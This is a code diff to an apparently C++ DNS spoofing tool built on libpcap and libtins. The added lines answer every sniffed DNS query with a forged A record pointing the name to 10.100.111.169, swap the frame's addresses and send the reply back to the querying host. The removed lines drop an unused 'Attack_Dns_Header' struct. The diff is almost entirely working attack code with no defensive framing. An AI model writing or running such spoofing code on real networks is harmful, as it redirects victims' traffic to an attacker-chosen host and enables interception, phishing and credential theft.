@@ -5,23 +5,6 @@
 #include <string>
 #include <memory.h>
 
-
-
-#define QUERY_RESPONSE_NO_ERROR 0x8180
-
-struct Attack_Dns_Header{
-    uint16_t id;         /* identification number */
-    uint16_t flags;      /* dns flags */
-    uint16_t q_count;    /* number of question entries */
-    uint16_t ans_count;  /* number of answer entries */
-    uint16_t auth_count; /* number of authority entries */
-    uint16_t add_count;  /* number of resource entries */
-};
-
-
-
-
-
 using namespace Tins;
 using namespace std;
 
@@ -32,7 +15,6 @@ pcap_if_t *alldevs;
 pcap_if_t *d;
 int i=0;
 char buf[65000];
-Attack_Dns_Header ad;
 char Select_device[10];
 char errbuf[PCAP_ERRBUF_SIZE];
 PacketSender sender;
@@ -112,8 +94,23 @@ int main(int argc, char *argv[])
 
                     spoof_dns = dns;
 
-                    cout<<spoof_dns.answers_count()<<"\n";
 
+                    spoof_dns.add_answer(DNS::Resource(query.dname(),"10.100.111.169",DNS::A,query.query_class(),777));
+
+                    //cout<<spoof_dns.answers_count()<<"\n";
+                   // cout<<query.dname()<<"\n";
+
+                    if (spoof_dns.answers_count() > 0)
+                    {
+                        spoof_dns.type(DNS::RESPONSE);
+
+                        spoof_dns.recursion_available(1);
+
+                        auto pkt = EthernetII(spoof_eth.dst_addr(),spoof_eth.src_addr()) / IP(spoof_ip.dst_addr(),spoof_ip.src_addr()) / UDP(spoof_udp.dport(),spoof_udp.sport()) / spoof_dns;
+
+                        sender.send(pkt);
+
+                    }
 
                 }
 
